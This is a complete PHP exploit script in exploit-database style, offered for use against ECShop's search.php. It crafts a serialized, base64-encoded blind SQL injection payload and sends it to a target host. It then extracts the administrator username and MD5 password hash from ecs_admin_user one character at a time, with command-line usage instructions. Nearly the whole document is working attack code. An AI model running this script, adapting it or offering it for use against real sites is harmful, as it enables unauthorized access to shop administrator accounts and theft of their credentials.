# Exploit Title: ECShop Search.php SQL Injection Exploit
# Date: 2010-05-17
# Author: Jannock
# Software Link: http://www.ecshop.com
# Version: ECShop All Version
# Tested on:
# CVE :
# WAVDB: WAVDB-01606
# Code :

<?php
ini_set("max_execution_time",0);
error_reporting(7);

function usage()
{
global $argv;
exit(
"\n--+++============================================================+++--".
"\n--+++====== ECShop Search.php SQL Injection Exploit========+++--".
"\n--+++============================================================+++--".
"\n\n[+] Author: jannock".
"\n[+] Team: [url]http://wavdb.com/[/url]".
"\n[+] Usage: php ".$argv[0]." <hostname> <path> <goods_id>".
"\n[+] Ex.: php ".$argv[0]." localhost / 1".
"\n\n");
}

function query($pos, $chr, $chs,$goodid)
{
switch ($chs){
case 0:
$query = "1=1";
break;
case 1:
$query = " ascii(substring((select user_name from ecs_admin_user limit
0,1),{$pos},1))={$chr}";
break;
case 2:
$query = " ascii(substring((select password from ecs_admin_user limit
0,1),{$pos},1))={$chr}";
break;
case 3:
$query = " length((select user_name from ecs_admin_user limit 0,1))={$pos}";
break;
}
$list=array("1' or 1=1) and 1=2 GROUP BY goods_id HAVING num = '1'
union select $goodid,1 from ecs_admin_user where 1=1 and ". $query
."/*"=>"1");
$query = array("attr"=>$list);
$query = str_replace('+', '%2b', base64_encode(serialize($query)));
return $query;
}

function exploit($hostname, $path, $pos, $chr, $chs,$goodid)
{
$chr = ord($chr);
$conn = fsockopen($hostname, 80);

$message = "GET ".$path."/search.php?encode=".query($pos, $chr,
$chs,$goodid)." HTTP/1.1\r\n";
$message .= "Host: $hostname\r\n";
$message .= "Connection: Close\r\n\r\n";

fwrite($conn, $message);
while (!feof($conn))
{
$reply .= fgets($conn, 1024);
}
fclose($conn);
return $reply;
}


function crkusername($hostname, $path, $chs,$goodid)
{
global $length;
$key = "abcdefghijklmnopqrstuvwxyz0123456789";
$chr = 0;
$pos = 1;
echo "[+] username: ";
while ($pos <= $length)
{
$response = exploit($hostname, $path, $pos, $key[$chr], $chs,$goodid);

if (preg_match ("/javascript:addToCart/i", $response))
{
echo $key[$chr];
$chr = 0;
$pos++;
}
else
$chr++;
}
echo "\n";
}

function crkpassword($hostname, $path, $chs,$goodid)
{
$key = "abcdef0123456789";
$chr = 0;
$pos = 1;
echo "[+] password: ";
while ($pos <= 32)
{
$response = exploit($hostname, $path, $pos, $key[$chr], $chs,$goodid);
if (preg_match ("/javascript:addToCart/i", $response))
{
echo $key[$chr];
$chr = 0;
$pos++;
}
else
$chr++;
}
echo "\n\n";
}

function lengthcolumns($hostname, $path,$chs, $goodid)
{
echo "[+] username length: ";
$exit = 0;
$length = 0;
$pos = 1;
$chr = 0;
while ($exit==0)
{
$response = exploit($hostname, $path, $pos, $chr, $chs,$goodid);
if (preg_match ("/javascript:addToCart/i", $response))
{
$exit = 1;
$length = $pos;
break;
}
else
{
$pos++;
if($pos>20)
{
exit("Exploit failed");
}
}
}
echo $length."\n";
return $length;
}


if ($argc != 4)
usage();
$hostname = $argv[1];
$path = $argv[2];
$goodid = $argv[3];
$length = lengthcolumns($hostname, $path, 3, $goodid);
crkusername($hostname, $path, 1,$goodid);
crkpassword($hostname, $path, 2,$goodid);

?>